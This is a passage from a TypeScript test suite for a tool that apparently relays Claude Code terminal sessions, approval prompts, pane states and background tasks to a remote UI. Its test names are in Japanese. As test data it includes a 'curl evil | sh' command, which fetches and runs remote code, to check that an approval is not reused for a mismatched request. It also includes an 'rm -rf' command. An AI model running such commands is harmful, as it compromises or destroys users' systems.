import assert from "node:assert/strict";
import fs from "node:fs";
import http from "node:http";
import os from "node:os";
import path from "node:path";
import test from "node:test";
import type { SessionEvent } from "../protocol.js";
import { ClaudeChannelInbox } from "./channelInbox.js";
import { BG_INTERRUPT_TEXT } from "./claudeAgentsRegistry.js";
import { ClaudeTerminalRegistry, ClaudeTerminalSession, inputPreviewMatches, readJsonLines, scanInterrupt } from "./claudeTerminal.js";
import { approvalKeys, DOWN, ENTER, ESC, heldKeys, parsePanes, planKeys, questionKeys, RIGHT, TerminalKeyRouter } from "./keys.js";
import { parsePaneEvent, REPLY_LIMIT, TerminalPaneStatus, paneState } from "./paneStatus.js";
import { handleTerminalRoute, type TerminalServices } from "./routes.js";

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "buddyos-term-"));
const SID = "44444444-4444-4444-8444-444444444444";

function setup(parents = new Map<number, number>(), watchers = 1, timing: { tailIntervalMs?: number; heldExpiryMs?: number; hookHoldMs?: number; isBackgroundWorker?: (sid: string) => boolean } = {}) {
  const published: SessionEvent[] = [];
  const pushes: Record<string, string>[] = [];
  const inbox = new ClaudeChannelInbox();
  const keys = new TerminalKeyRouter(async () => parents);
  const panes = new TerminalPaneStatus();
  const registry = new ClaudeTerminalRegistry({
    publish: (e) => published.push(e),
    push: (_t, _b, d) => pushes.push(d),
    watchers: () => watchers,
    inbox,
    keys,
    panes,
    bridgeId: "b1",
    persistFile: path.join(tmp, `ledger-${Math.random()}.json`),
    claudeHome: tmp,
    ...timing
  });
  return { published, pushes, inbox, keys, panes, registry };
}

test("キーの手順: 許可・計画・質問（単一・自由記述・複数選択）", () => {
  assert.deepEqual(approvalKeys("allow", false), ["1"]);
  assert.deepEqual(approvalKeys("allowForSession", true), ["2"]);
  assert.deepEqual(approvalKeys("deny", true), [ESC]);
  assert.deepEqual(planKeys("allowAuto"), ["1"]);
  assert.deepEqual(heldKeys("allow"), [DOWN, ENTER], "保留: ↓ Enter で Deliver this message to Claude");
  assert.deepEqual(heldKeys("deny"), [ESC], "保留: Esc で Deny（届かない）");
  assert.deepEqual(planKeys("ここを直して"), ["3", "ここを直して", ENTER]);
  const qs = [
    { question: "色は？", options: [{ label: "赤" }, { label: "青" }] },
    { question: "形は？", multiSelect: true, options: [{ label: "丸" }, { label: "四角" }] }
  ];
  assert.deepEqual(questionKeys(qs, { "色は？": ["緑"], "形は？": ["丸", "四角"] }), ["3", "緑", ENTER, "1", "2", RIGHT, ENTER]);
  assert.equal(questionKeys(qs, { "色は？": ["赤"] }), undefined, "答えの無い質問があれば送らない");
});

test("hook: 発話・本文・ツール・終わりをイベントにし、ペインの状態も書く", () => {
  const { published, registry, panes } = setup();
  registry.register(SID, "C:\\w", undefined, undefined);
  registry.ingest({ session_id: SID, hook_event_name: "UserPromptSubmit", prompt: "やって" }, "pane-1");
  registry.ingest({ session_id: SID, hook_event_name: "PreToolUse", tool_name: "Bash", tool_use_id: "t1", tool_input: { command: "ls" } }, "pane-1");
  registry.ingest({ session_id: SID, hook_event_name: "PostToolUse", tool_name: "Bash", tool_use_id: "t1", tool_response: "ok" });
  registry.ingest({ session_id: SID, hook_event_name: "MessageDisplay", message_id: "m", delta: "できました" });
  registry.ingest({ session_id: SID, hook_event_name: "Stop" });
  assert.deepEqual(published.map((e) => e.type), ["user_message", "tool_start", "tool_end", "assistant_delta", "done"]);
  assert.equal(published[1].content, "ls");
  assert.match(published[1].metadata?.startedAtMs ?? "", /^\d{13}$/, "tool_start は開始時刻を持つ");
  assert.equal(published[3].messageId, published[4].messageId, "本文と done は同じ吹き出し");
  assert.equal(paneState("Stop", {}), "done");
  // 終わった後の表示（離席中のまとめなど）では作業中に戻さない。ターンの途中なら作業中のまま。
  registry.ingest({ session_id: SID, hook_event_name: "MessageDisplay", message_id: "recap", delta: "まとめ" });
  assert.equal(paneState("MessageDisplay", {}, "done"), undefined);
  assert.equal(paneState("MessageDisplay", {}, "working"), "working");
  // サブエージェントの始まり・終わりでは変えない（バックグラウンドの作業は数で別に持つ）。
  assert.equal(paneState("SubagentStop", {}, "working"), undefined);
  return panes.poll(-1, 10).then((r) => assert.deepEqual(r.panes.map((p) => [p.pane, p.state, p.turn]), [["pane-1", "done", 1]]));
});

test("ペイン: Stop の last_assistant_message を reply に持ち、次の状態で消す。中断（idle）では持たない", async () => {
  const { registry, panes } = setup();
  registry.register(SID, "C:\\w", undefined, undefined, undefined, "pane-r");
  registry.ingest({ session_id: SID, hook_event_name: "UserPromptSubmit", prompt: "やって" }, "pane-r");
  registry.ingest({ session_id: SID, hook_event_name: "Stop", last_assistant_message: "できました" }, "pane-r");
  let e = (await panes.poll(-1, 0)).panes.find((p) => p.pane === "pane-r");
  assert.deepEqual([e?.agent, e?.state, e?.turn, e?.reply], ["claude", "done", 1, "できました"]);
  registry.ingest({ session_id: SID, hook_event_name: "UserPromptSubmit", prompt: "次" }, "pane-r");
  e = (await panes.poll(-1, 0)).panes.find((p) => p.pane === "pane-r");
  assert.equal(e?.state, "working");
  assert.equal(e?.reply, undefined, "次のターンが始まったら前の返事は消す");
  registry.ingest({ session_id: SID, hook_event_name: "Stop", buddy_interrupted: true, last_assistant_message: "途中" }, "pane-r");
  e = (await panes.poll(-1, 0)).panes.find((p) => p.pane === "pane-r");
  assert.equal(e?.state, "idle");
  assert.equal(e?.reply, undefined, "中断では持たない");
  assert.equal(JSON.parse(JSON.stringify(e)).reply, undefined, "poll の本文にも出さない");
});

test("ペイン: reply は done のときだけ・16,000 字で切る・別のエージェントも持てる", async () => {
  const st = new TerminalPaneStatus();
  st.set("p1", "working", "s1", undefined, "claude", "ignored");
  assert.equal((await st.poll(-1, 0)).panes[0].reply, undefined);
  st.set("p1", "done", "s1", undefined, "claude", "😀".repeat(20_000));
  let e = (await st.poll(-1, 0)).panes[0];
  assert.equal(e.turn, 1);
  assert.equal(Array.from(e.reply ?? "").length, REPLY_LIMIT);
  st.set("p1", "done", "s1", undefined, "claude", "dup");
  assert.equal((await st.poll(-1, 0)).panes[0].turn, 1, "done の重複は数えない");
  st.set("p1", "working", "s1", undefined);
  st.set("p1", "done", "s1", undefined, "claude", "二回目");
  e = (await st.poll(-1, 0)).panes[0];
  assert.deepEqual([e.turn, e.reply], [2, "二回目"]);
  st.set("p2", "done", undefined, undefined, "codex", "ok");
  const p2 = (await st.poll(-1, 0)).panes.find((p) => p.pane === "p2");
  assert.deepEqual([p2?.agent, p2?.turn, p2?.reply], ["codex", 1, "ok"]);
});

test("ペイン: POST /terminal/pane-event の本文の確かめ", () => {
  assert.deepEqual(parsePaneEvent({ pane: "pane-1", agent: "codex", state: "done", sessionId: "t1", cwd: "/tmp", reply: "hi" }), {
    pane: "pane-1",
    agent: "codex",
    state: "done",
    sessionId: "t1",
    cwd: "/tmp",
    reply: "hi"
  });
  assert.equal(parsePaneEvent({ pane: "p", state: "working" })?.agent, "claude", "agent が無ければ claude");
  for (const s of ["working", "attention", "done", "error", "idle"]) assert.ok(parsePaneEvent({ pane: "p", agent: "codex", state: s }), s);
  assert.equal(parsePaneEvent({ pane: "p", agent: "codex", state: "finished" }), undefined);
  assert.equal(parsePaneEvent({ pane: "p", agent: "codex" }), undefined);
  assert.equal(parsePaneEvent({ pane: "../x", agent: "codex", state: "done" }), undefined);
  assert.equal(parsePaneEvent({ agent: "codex", state: "done" }), undefined);
  for (const agent of ["Codex", "a b", "", 1, "a".repeat(33)]) assert.equal(parsePaneEvent({ pane: "p", agent, state: "done" }), undefined, String(agent));
  assert.ok(parsePaneEvent({ pane: "p", agent: "a".repeat(32), state: "done" }));
});

test("iPhone から channel で送った発話は、戻ってきた UserPromptSubmit を二重に出さない", () => {
  const { published, registry } = setup();
  registry.register(SID);
  registry.ingest({ session_id: SID, hook_event_name: "UserPromptSubmit", prompt: '<channel source="buddy">hi</channel>' });
  assert.equal(published.filter((e) => e.type === "user_message").length, 0);
});

test("承認: デスクトップのターミナル（pty）ならキーで答え、見ていなければ通知する", async () => {
  // claude(300) → shell(200) → pty(100)
  const { published, pushes, registry, keys } = setup(new Map([[300, 200], [200, 100]]), 0);
  registry.register(SID, undefined, 300);
  const poll = keys.poll("pty-host", [100], 2000);
  await registry.ingestPermission({ session_id: SID, tool_name: "Bash", tool_input: { command: "rm -rf x" }, permission_suggestions: [{}] });
  const card = published.find((e) => e.type === "action_request")!;
  assert.equal(card.metadata?.answerVia, "pty");
  assert.equal(card.metadata?.option_count, "3");
  assert.equal(card.metadata?.subtitle, "rm -rf x");
  assert.equal(pushes[0].kind, "approval_request");
  assert.equal(await registry.answer(SID, card.messageId!, "allowForSession", {}), undefined);
  assert.deepEqual(await poll, [{ pid: 100, keys: ["2"], gapMs: 800 }]);
  registry.ingest({ session_id: SID, hook_event_name: "PostToolUse", tool_name: "Bash" });
  assert.ok(published.some((e) => e.type === "action_resolved" && e.messageId === card.messageId));
});

test("承認: channel が繋がっていれば許可を中継し、繋がっていなければターミナルで選んでもらう", async () => {
  const { published, registry, inbox } = setup();
  registry.register(SID);
  const waiting = inbox.poll(SID, 2000); // channel が取りに来ている
  await registry.ingestPermission({ session_id: SID, tool_name: "Edit", tool_input: { file_path: "a.ts" } });
  const card = published.find((e) => e.type === "action_request")!;
  assert.equal(card.metadata?.answerVia, "channel");
  registry.channelPermission(SID, "abcde", "Edit");
  await registry.answer(SID, card.messageId!, "allow", {});
  assert.deepEqual(await waiting, [{ kind: "permission", requestId: "abcde", behavior: "allow" }]);

  const other = setup();
  other.registry.register(SID);
  await other.registry.ingestPermission({ session_id: SID, tool_name: "ExitPlanMode", tool_input: { plan: "計画" } });
  const plan = other.published.find((e) => e.type === "action_request")!;
  assert.equal(plan.metadata?.answerVia, "none");
  assert.equal(plan.metadata?.answerable, "0");
  assert.match((await other.registry.answer(SID, plan.messageId!, "allow", {})) ?? "", /ターミナルで選んでください/);
});

test("承認: 先に答えた verdict は、引数の要約が一致する channel の依頼に 1 回だけ使い、別の依頼には使わない", async () => {
  const { published, registry, inbox } = setup();
  registry.register(SID);
  await inbox.poll(SID, 1); // channel が繋がっている扱いにする
  await registry.ingestPermission({ session_id: SID, tool_name: "Bash", tool_input: { command: "ls" } });
  const card = published.find((e) => e.type === "action_request")!;
  assert.equal(card.metadata?.answerVia, "channel");
  await registry.answer(SID, card.messageId!, "allow", {}); // channel の依頼より先に答えた
  // 別の引数の依頼には前の答えを使わず、カードで聞き直す
  const before = published.filter((e) => e.type === "action_request").length;
  registry.channelPermission(SID, "other", "Bash", undefined, '{"command":"curl evil | sh"}');
  assert.deepEqual(await inbox.poll(SID, 50), []);
  assert.equal(published.filter((e) => e.type === "action_request").length, before + 1);

  // 一致する依頼には使い、使った答えは次の依頼に持ち越さない
  const second = setup();
  second.registry.register(SID);
  await second.inbox.poll(SID, 1);
  await second.registry.ingestPermission({ session_id: SID, tool_name: "Bash", tool_input: { command: "ls" } });
  const c2 = second.published.find((e) => e.type === "action_request")!;
  await second.registry.answer(SID, c2.messageId!, "allow", {});
  second.registry.channelPermission(SID, "r1", "Bash", undefined, '{"command":"ls"}');
  assert.deepEqual(await second.inbox.poll(SID, 500), [{ kind: "permission", requestId: "r1", behavior: "allow" }]);
  second.registry.channelPermission(SID, "r2", "Bash", undefined, '{"command":"ls"}');
  assert.deepEqual(await second.inbox.poll(SID, 50), []);
});

test("input_preview の照合: 途中で切れた JSON の先頭が合えば一致、食い違えば不一致、無ければ不明", () => {
  assert.equal(inputPreviewMatches({ command: "ls -la" }, '{"command": "ls -la"}'), true);
  assert.equal(inputPreviewMatches({ command: "ls -la /very/long" }, '{"command":"ls -la…'), true);
  assert.equal(inputPreviewMatches({ command: "ls" }, '{"command":"rm x"}'), false);
  assert.equal(inputPreviewMatches({ command: "ls" }, undefined), undefined);
  assert.equal(inputPreviewMatches({}, '{"command":"ls"}'), undefined);
});

test("送信: channel があれば受け箱に置いてターンの終わりまで待ち、無ければ閲覧のみと返す", async () => {
  const { registry, inbox } = setup();
  registry.register(SID);
  const session = new ClaudeTerminalSession(SID, registry, inbox);
  const got = inbox.poll(SID, 2000);
  let finished = false;
  const sending = session.send("続けて", { type: "user_message", content: "続けて" }, () => {}).then(() => (finished = true));
  assert.deepEqual(await got, [{ kind: "text", text: "続けて" }]);
  await new Promise((r) => setTimeout(r, 20));
  assert.equal(finished, false, "Stop が来るまで送信中");
  registry.ingest({ session_id: SID, hook_event_name: "Stop" });
  await sending;

  const lonely = setup();
  lonely.registry.register(SID);
  const events: SessionEvent[] = [];
  await new ClaudeTerminalSession(SID, lonely.registry, lonely.inbox).send("x", { type: "user_message" }, (e) => events.push(e));
  assert.deepEqual(events.map((e) => e.type), ["error", "done"]);
  assert.equal(events[1].metadata?.errored, "true");
});

test("Esc の中断は transcript の印で見つける", () => {
  const file = path.join(tmp, "t.jsonl");
  fs.writeFileSync(file, `${JSON.stringify({ type: "user", message: { content: "前" } })}\n`);
  const start = fs.statSync(file).size;
  fs.appendFileSync(file, `${JSON.stringify({ type: "user", message: { content: [{ type: "text", text: "[Request interrupted by user]" }] } })}\n`);
  assert.equal(scanInterrupt(file, start).interrupted, true);
  assert.equal(scanInterrupt(file, fs.statSync(file).size).interrupted, false);
});

const sleep = (ms: number): Promise<void> => new Promise((r) => setTimeout(r, ms));
const line = (o: unknown): string => `${JSON.stringify(o)}\n`;
const HELD = { type: "system", subtype: "informational", content: "Held peer message — waiting for your approval", level: "warning" };

test("受け箱の保留: transcript の「Held peer message」でカードを出し、届ける / 取り消すをキーで答える", async () => {
  // claude(300) → shell(200) → pty(100)
  const { published, pushes, registry, keys } = setup(new Map([[300, 200], [200, 100]]), 0, { tailIntervalMs: 20 });
  const file = path.join(tmp, `held-${Math.random()}.jsonl`);
  fs.writeFileSync(file, line({ type: "user", message: { content: "前" } }));
  registry.register(SID, undefined, 300, file);
  keys.poll("pty-host", [100], 50); // デスクトップが pty を名乗る
  const offset = registry.transcriptEnd(SID);
  fs.appendFileSync(file, line(HELD)); // 書いた直後に保留の印が載る
  registry.noteInboxPrompt(SID, "テストを走らせて", offset);
  await sleep(100);
  const done = published.find((e) => e.type === "done");
  assert.equal(done?.metadata?.errored, "true", "考え中を戻す");
  const card = published.find((e) => e.type === "action_request")!;
  assert.equal(card.metadata?.answerVia, "pty");
  assert.equal(card.metadata?.option_count, "2");
  assert.equal(card.metadata?.option_0_value, "allow");
  assert.match(card.content ?? "", /保留されています：「テストを走らせて」/);
  assert.equal(pushes.length, 1, "誰も見ていなければ通知する");

  // Stop では閉じない（ターミナルのダイアログはターンとは別に残る）。
  registry.ingest({ session_id: SID, hook_event_name: "Stop" });
  assert.ok(!published.some((e) => e.type === "action_resolved"));

  // 届ける → ↓ Enter。発話が届いた（UserPromptSubmit のエコー）ところで閉じ、吹き出しは出さない。
  const poll = keys.poll("pty-host", [100], 2000);
  assert.equal(await registry.answer(SID, card.messageId!, "allow", {}), undefined);
  assert.deepEqual(await poll, [{ pid: 100, keys: [DOWN, ENTER], gapMs: 800 }]);
  assert.ok(!published.some((e) => e.type === "action_resolved"));
  registry.ingest({ session_id: SID, hook_event_name: "UserPromptSubmit", prompt: "テストを走らせて" });
  assert.ok(published.some((e) => e.type === "action_resolved" && e.messageId === card.messageId));
  assert.equal(published.filter((e) => e.type === "user_message").length, 0);

  // 取り消す → Esc。hook は来ないので、その場でカードを閉じる。
  published.length = 0;
  const offset2 = registry.transcriptEnd(SID);
  fs.appendFileSync(file, line(HELD));
  registry.noteInboxPrompt(SID, "もう一つ", offset2);
  await sleep(100);
  const card2 = published.find((e) => e.type === "action_request")!;
  const poll2 = keys.poll("pty-host", [100], 2000);
  await registry.answer(SID, card2.messageId!, "deny", {});
  assert.deepEqual(await poll2, [{ pid: 100, keys: [ESC], gapMs: 800 }]);
  assert.ok(published.some((e) => e.type === "action_resolved" && e.messageId === card2.messageId));
  registry.unregister(SID);
});

test("受け箱の保留: キーで答えられなければ見せるだけ。期限が来たらカードを閉じてエラーを出す", async () => {
  const { published, registry } = setup(new Map(), 1, { tailIntervalMs: 20, heldExpiryMs: 80 });
  const file = path.join(tmp, `held-${Math.random()}.jsonl`);
  fs.writeFileSync(file, "");
  registry.register(SID, undefined, undefined, file);
  registry.noteInboxPrompt(SID, "x", 0);
  fs.appendFileSync(file, line(HELD));
  await sleep(60);
  const card = published.find((e) => e.type === "action_request")!;
  assert.equal(card.metadata?.answerable, "0");
  assert.match((await registry.answer(SID, card.messageId!, "allow", {})) ?? "", /ターミナルで選んでください/);
  await sleep(120);
  assert.ok(published.some((e) => e.type === "action_resolved" && e.messageId === card.messageId));
  assert.match(published.at(-1)?.content ?? "", /時間切れか、ターミナルで Deny/);
  registry.unregister(SID);
});

test("バックグラウンドの作業: run_in_background は行になり、task-notification は吹き出しに出さずに行を閉じる", () => {
  const { published, registry } = setup();
  registry.register(SID);
  registry.ingest({ session_id: SID, hook_event_name: "PreToolUse", tool_name: "Bash", tool_use_id: "tb", tool_input: { command: "npm run dev", description: "開発サーバ", run_in_background: true } });
  registry.ingest({ session_id: SID, hook_event_name: "PostToolUse", tool_name: "Bash", tool_use_id: "tb", tool_response: { backgroundTaskId: "bg1" } });
  const started = published.filter((e) => e.type === "workflow_progress").at(-1)!;
  const row = (e: SessionEvent): Record<string, unknown> => (JSON.parse(e.content ?? "{}") as { agents: Record<string, unknown>[] }).agents[0];
  assert.equal(row(started).rowKind, "shell");
  assert.equal(row(started).label, "開発サーバ");
  // Esc の中断ではシェルは閉じない。
  registry.ingest({ session_id: SID, hook_event_name: "Stop", buddy_interrupted: true, background_tasks: [{ id: "bg1", type: "local_bash" }] });
  assert.equal(published.filter((e) => e.type === "workflow_progress").length, 1);
  published.length = 0;
  registry.ingest({
    session_id: SID,
    hook_event_name: "UserPromptSubmit",
    prompt: "<task-notification>\n<task-id>bg1</task-id>\n<status>completed</status>\n<summary>done</summary>\n</task-notification>"
  });
  assert.deepEqual(published.map((e) => e.type), ["workflow_progress"], "知らせだけなら吹き出しは出さない");
  assert.equal(row(published[0]).state, "done");
  published.length = 0;
  registry.ingest({ session_id: SID, hook_event_name: "UserPromptSubmit", prompt: "<task-notification><task-id>zz</task-id></task-notification>\n続けて" });
  assert.equal(published.find((e) => e.type === "user_message")?.content, "続けて");
});

test("バックグラウンドの作業: transcript に積まれた知らせ（queue-operation）でも行を閉じる", async () => {
  const { published, registry } = setup(new Map(), 1, { tailIntervalMs: 20 });
  const file = path.join(tmp, `bg-${Math.random()}.jsonl`);
  fs.writeFileSync(file, "");
  registry.register(SID, undefined, undefined, file);
  registry.ingest({ session_id: SID, hook_event_name: "PreToolUse", tool_name: "Bash", tool_use_id: "tq", tool_input: { command: "sleep 9", run_in_background: true } });
  registry.ingest({ session_id: SID, hook_event_name: "PostToolUse", tool_name: "Bash", tool_use_id: "tq", tool_response: { backgroundTaskId: "bg2" } });
  fs.appendFileSync(file, line({ type: "queue-operation", operation: "enqueue", content: "<task-notification><task-id>bg2</task-id><status>failed</status></task-notification>" }));
  await sleep(80);
  const last = published.filter((e) => e.type === "workflow_progress").at(-1)!;
  assert.equal((JSON.parse(last.content ?? "{}") as { agents: Array<{ state: string }> }).agents[0].state, "failed");
  registry.unregister(SID);
});

test("起動の PreToolUse を伴わない SubagentStart は補助として無視し、その中のツールも出さない", () => {
  const { published, registry } = setup();
  registry.register(SID);
  registry.ingest({ session_id: SID, hook_event_name: "SubagentStart", agent_id: "helper", agent_type: "" });
  registry.ingest({ session_id: SID, hook_event_name: "PreToolUse", agent_id: "helper", tool_name: "Read", tool_use_id: "r1", tool_input: {} });
  registry.ingest({ session_id: SID, hook_event_name: "PostToolUse", agent_id: "helper", tool_name: "Read", tool_use_id: "r1" });
  registry.ingest({ session_id: SID, hook_event_name: "SubagentStop", agent_id: "helper", last_assistant_message: "そのまま続けて" });
  assert.deepEqual(published, []);
});

test("停止: デスクトップのターミナルで動いていれば Esc を 1 ターンに 1 回だけ送る。届かなければ理由を返す", async () => {
  // claude(300) → pty(100)
  const { registry, keys } = setup(new Map([[300, 100]]));
  registry.register(SID, undefined, 300, undefined);
  keys.poll("pty-host", [100], 50); // デスクトップが pty を名乗る
  assert.equal(await registry.interrupt(SID), undefined, "ターン中でなければ何もしない");
  registry.ingest({ session_id: SID, hook_event_name: "UserPromptSubmit", prompt: "やって" });

  const poll = keys.poll("pty-host", [100], 2000);
  assert.equal(await registry.interrupt(SID), undefined);
  assert.deepEqual(await poll, [{ pid: 100, keys: [ESC], gapMs: 0 }]);
  // 2 回目の Esc は Claude Code の巻き戻しの画面を開くので、同じターンには送らない。
  assert.equal(await registry.interrupt(SID), undefined);
  assert.deepEqual(await keys.poll("pty-host", [100], 50), []);
  registry.unregister(SID);

  // アプリ内ターミナルの外（普通のターミナル）で動いている。
  const other = setup();
  other.registry.register(SID, undefined, 300, undefined);
  other.registry.ingest({ session_id: SID, hook_event_name: "UserPromptSubmit", prompt: "やって" });
  assert.match((await other.registry.interrupt(SID)) ?? "", /ターミナルで Esc を押してください/);
  other.registry.unregister(SID);
});

test("ペイン: hook が名乗ったペインで宛先を決める（pid が分からなくても答えられる）", async () => {
  // 親の表には何も無い（pid も無い）。デスクトップがペイン id を名乗っている。
  const { published, registry, keys } = setup();
  registry.register(SID);
  keys.poll("pty-host", [100], 50, parsePanes("pane-9:100"));
  await registry.ingestPermission({ session_id: SID, tool_name: "Bash", tool_input: { command: "ls" } }, "pane-9");
  const card = published.find((e) => e.type === "action_request")!;
  assert.equal(card.metadata?.answerVia, "pty");
  const poll = keys.poll("pty-host", [100], 2000, parsePanes("pane-9:100"));
  assert.equal(await registry.answer(SID, card.messageId!, "allow", {}), undefined);
  assert.deepEqual(await poll, [{ pid: 100, keys: ["1"], gapMs: 800 }]);
  assert.deepEqual([...parsePanes("pane-9:100,bad id:5,x:0,:3")], [["pane-9", 100]]);
  assert.equal(keys.ptyForPane("pane-9"), 100);
  assert.equal(keys.ptyForPane("other"), undefined);
  registry.unregister(SID);
});

test("承認: ターミナルの外なら hook の応答を持ち、カードの答えを返す", async () => {
  const { published, registry } = setup();
  registry.register(SID);
  const held = await registry.ingestPermissionHeld(
    { session_id: SID, tool_name: "Bash", tool_input: { command: "ls" }, permission_suggestions: [{ type: "addRules" }] },
    undefined,
    true
  );
  const card = published.find((e) => e.type === "action_request")!;
  assert.equal(card.metadata?.answerVia, "hook");
  assert.equal(card.metadata?.answerable, "1");
  assert.equal(card.metadata?.option_count, "3");
  assert.equal(await registry.answer(SID, card.messageId!, "allowForSession", {}), undefined);
  assert.deepEqual(await held.decision, {
    hookSpecificOutput: { hookEventName: "PermissionRequest", decision: { behavior: "allow", updatedPermissions: [{ type: "addRules" }] } }
  });
  assert.ok(published.some((e) => e.type === "action_resolved" && e.messageId === card.messageId));

  // 非承認も応答で返す。
  const deny = await registry.ingestPermissionHeld({ session_id: SID, tool_name: "Edit", tool_input: {} }, undefined, true);
  const card2 = published.filter((e) => e.type === "action_request").at(-1)!;
  await registry.answer(SID, card2.messageId!, "deny", {});
  const out = (await deny.decision) as { hookSpecificOutput: { decision: { behavior: string } } };
  assert.equal(out.hookSpecificOutput.decision.behavior, "deny");

  // 質問・計画と、応答を待てない hook（前の版）は今までどおり見せるだけ。
  await registry.ingestPermissionHeld({ session_id: SID, tool_name: "ExitPlanMode", tool_input: { plan: "p" } }, undefined, true);
  assert.equal(published.filter((e) => e.type === "action_request").at(-1)!.metadata?.answerVia, "none");
  await registry.ingestPermission({ session_id: SID, tool_name: "Write", tool_input: {} });
  assert.equal(published.filter((e) => e.type === "action_request").at(-1)!.metadata?.answerVia, "none");
  registry.unregister(SID);
});

test("承認: hook の応答を持ったまま、ターミナルで選ばれた・時間切れ・hook が切れた", async () => {
  const { published, registry } = setup(new Map(), 1, { hookHoldMs: 30 });
  registry.register(SID);
  // ターミナルで選ばれた（PostToolUse）。応答は空で返す。
  const a = await registry.ingestPermissionHeld({ session_id: SID, tool_name: "Bash", tool_input: {} }, undefined, true);
  registry.ingest({ session_id: SID, hook_event_name: "PostToolUse", tool_name: "Bash" });
  assert.equal(await a.decision, undefined);

  // 時間切れ。カードは見せるだけに戻る（期限のタイマーは unref なので、待つ間ループを止めない）。
  const b = await registry.ingestPermissionHeld({ session_id: SID, tool_name: "Read", tool_input: {} }, undefined, true);
  const keep = setInterval(() => {}, 1000);
  assert.equal(await b.decision, undefined);
  clearInterval(keep);
  const again = published.filter((e) => e.type === "action_request").at(-1)!;
  assert.equal(again.metadata?.answerVia, "none");
  assert.match((await registry.answer(SID, again.messageId!, "allow", {})) ?? "", /claude --resume/);

  // hook が先に切れた。カードを閉じる。
  const c = await registry.ingestPermissionHeld({ session_id: SID, tool_name: "Glob", tool_input: {} }, undefined, true);
  const card = published.filter((e) => e.type === "action_request").at(-1)!;
  c.cancel?.();
  assert.equal(await c.decision, undefined);
  assert.ok(published.some((e) => e.type === "action_resolved" && e.messageId === card.messageId));
  registry.unregister(SID);
});

test("登録: ペインを名乗れば待機中にし、終わった会話は台帳から落とす", async () => {
  const { registry, panes } = setup();
  registry.register(SID, "C:\\w", undefined, undefined, undefined, "pane-3");
  assert.deepEqual((await panes.poll(-1, 10)).panes.map((p) => [p.pane, p.state, p.sessionId]), [["pane-3", "idle", SID]]);
  // compact の後の SessionStart では、作業中の状態を戻さない。
  registry.ingest({ session_id: SID, hook_event_name: "UserPromptSubmit", prompt: "やって" }, "pane-3");
  registry.register(SID, undefined, undefined, undefined, undefined, "pane-3");
  assert.equal(panes.state("pane-3", SID), "working");

  // pid の分からない会話は、しばらく hook が来なければ落とす。
  registry.pruneStale(Date.now());
  assert.equal(registry.liveEntries().length, 1);
  registry.pruneStale(Date.now() + 2 * 60 * 60_000);
  assert.equal(registry.liveEntries().length, 0);
  assert.equal(panes.state("pane-3", SID), undefined);
});

test("ルート: hook の応答を持つ・session-start でペインを名乗る・SessionEnd で掃除する", async () => {
  const { published, registry, inbox, keys, panes } = setup();
  const services: TerminalServices = { registry, inbox, keys, panes, handOver: () => false };
  const server = http.createServer((req, res) => {
    void handleTerminalRoute(req, res, new URL(req.url ?? "/", "http://localhost"), services);
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  const base = `http://127.0.0.1:${(server.address() as { port: number }).port}`;
  const post = (p: string, body: unknown, headers: Record<string, string> = {}): Promise<Response> =>
    fetch(base + p, { method: "POST", headers: { "content-type": "application/json", ...headers }, body: JSON.stringify(body) });
  try {
    const started = await post("/claude/session-start", { session_id: SID, cwd: "C:\\w" }, { "x-buddyos-pane": "pane-7" });
    assert.equal(started.status, 200);
    assert.equal(panes.state("pane-7", SID), "idle");

    // 応答を待てない hook には、すぐ空で返す。
    const quick = await post("/claude/hook", { session_id: SID, hook_event_name: "PermissionRequest", tool_name: "Bash", tool_input: {} });
    assert.equal(quick.status, 200);
    assert.equal(await quick.text(), "");

    // 応答を待てる hook には、カードの答えを返す。
    const pending = post("/claude/hook", { session_id: SID, hook_event_name: "PermissionRequest", tool_name: "Edit", tool_input: {} }, { "x-buddyos-hold": "1" });
    let card: SessionEvent | undefined;
    for (let i = 0; i < 200 && !card; i++) {
      await new Promise((r) => setTimeout(r, 10));
      card = published.find((e) => e.type === "action_request" && e.toolName === "Edit");
    }
    assert.equal(card?.metadata?.answerVia, "hook");
    await registry.answer(SID, card!.messageId!, "allow", {});
    const res = await pending;
    assert.deepEqual(await res.json(), { hookSpecificOutput: { hookEventName: "PermissionRequest", decision: { behavior: "allow" } } });

    const ended = await post("/claude/session-end", { session_id: SID });
    assert.equal(ended.status, 200);
    assert.equal(registry.isLive(SID), false);

    // hook を使わないエージェント（Codex の proxy）がペインの状態を知らせる。poll に agent と reply が出る。
    assert.equal((await post("/terminal/pane-event", { pane: "pane-c", agent: "codex", state: "working", sessionId: "t1" })).status, 200);
    assert.equal((await post("/terminal/pane-event", { pane: "pane-c", agent: "codex", state: "done", sessionId: "t1", reply: "終わりました" })).status, 200);
    const polled = (await (await fetch(base + "/terminal/panes/poll?since=-1")).json()) as { panes: Array<Record<string, unknown>> };
    const c = polled.panes.find((x) => x.pane === "pane-c");
    assert.deepEqual([c?.agent, c?.state, c?.turn, c?.reply, c?.sessionId], ["codex", "done", 1, "終わりました", "t1"]);
    assert.equal((await post("/terminal/pane-event", { pane: "pane-c", agent: "codex", state: "bogus" })).status, 400);
    assert.equal((await post("/terminal/pane-event", { pane: "a b", agent: "codex", state: "done" })).status, 400);
    assert.equal((await post("/terminal/pane-event", { pane: "pane-c", agent: "Bad Agent", state: "done" })).status, 400);
    assert.equal((await post("/terminal/pane-event", ["not", "an", "object"])).status, 400);
    assert.equal((await post("/terminal/pane-event", { pane: "pane-c", state: "done", reply: "x".repeat(70 * 1024) }).catch(() => ({ status: 400 }))).status, 400);
  } finally {
    server.close();
  }
});

/* ── バックグラウンドの作業（docs/BACKGROUND_WORK_2026-10-21.md §3.4。hook の形は claude 2.1.300 の実測。mac の ClaudeTerminalHooksTests と同じ場面） ── */

const hook = (event: string, extra: Record<string, unknown> = {}, sid = SID): Record<string, unknown> => ({ session_id: sid, hook_event_name: event, ...extra });

/** workflow_progress の payload の行（id → 行。同じ行が何度も来たら最後のもの）。 */
function rowsOf(events: SessionEvent[]): Map<string, Record<string, unknown>> {
  const out = new Map<string, Record<string, unknown>>();
  for (const e of events) {
    if (e.type !== "workflow_progress") continue;
    for (const a of (JSON.parse(e.content ?? "{}") as { agents?: Array<Record<string, unknown>> }).agents ?? []) out.set(String(a.id), a);
  }
  return out;
}

/** トラッカーの全行（subagentSnapshot）。 */
function snapshotRows(registry: ClaudeTerminalRegistry, sid = SID): Map<string, Record<string, unknown>> {
  const raw = registry.subagentSnapshot(sid);
  assert.ok(raw);
